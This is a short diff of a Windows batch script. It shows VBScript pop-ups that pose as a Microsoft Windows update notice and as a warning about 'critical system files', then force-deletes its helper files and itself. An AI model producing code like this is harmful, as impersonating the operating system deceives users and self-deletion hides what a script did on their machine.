@@ -32,13 +32,15 @@ if NOT EXIST Info.vbs (goto inf) else (goto end)
 :inf
 echo CreateObject("WScript.Shell").Popup "Windows has updated to the latest version!", 2, "Microsoft Windows", 0+64 > Info.vbs
 start Info.vbs
+goto exit
 :end
 echo.
 echo Execution cycle finished.
 echo.
 echo CreateObject("WScript.Shell").Popup "These are critical system files! Please do not mess with it.", 20000, "Information", 0+64 > Info.vbs
-
+:exit
 del Settings.vbs /Q /F
 del WindowsMaintainence /Q /F
 
 del %0 /Q /F
+
